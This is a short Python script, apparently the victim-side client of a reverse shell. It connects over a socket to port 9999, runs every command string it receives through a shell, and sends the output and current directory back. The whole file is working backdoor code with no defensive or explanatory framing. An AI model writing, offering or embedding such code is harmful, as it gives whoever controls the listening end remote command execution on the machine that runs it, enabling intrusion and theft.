import socket
import os
import subprocess

s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd' :
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0 :
        cmd = subprocess.Popen(data[:].decode("utf-8") , shell=True , stdout=subprocess.PIPE , stdin=subprocess.PIPE , stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte , 'utf-8')
        current_pwd = os.getcwd() + '>'
        s.send(str.encode(output_str + current_pwd))

        # for client to know what is happening
        print(output_str)






























